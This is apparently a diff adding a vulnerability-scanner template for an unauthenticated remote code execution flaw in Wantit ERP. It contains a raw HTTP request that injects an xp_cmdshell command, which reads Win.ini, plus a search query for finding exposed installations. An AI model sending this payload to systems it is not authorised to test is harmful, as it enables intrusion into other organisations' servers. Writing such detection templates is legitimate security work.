@@ -1,0 +1,42 @@
+http:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - bit app support
+    - fonts
+    - extensions
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'POST /mainFunctions/comboxstore.action HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    comboxsql=exec%20xp_cmdshell%20''type%20C:\Windows\Win.ini''
+
+    '
+id: wantit-erp-rce
+info:
+  author: Co5mos
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  description: 'Wantit ERP allows remote unauthenticated users to to execute arbitrary
+    commands.
+
+    '
+  metadata:
+    fofa-query: "app=\"\u4F01\u671B-ERP\u7CFB\u7EDF\""
+    max-request: 1
+    verified: true
+  name: Wantit ERP - Remote Code Execution
+  severity: critical
+  tags: wantit,rce
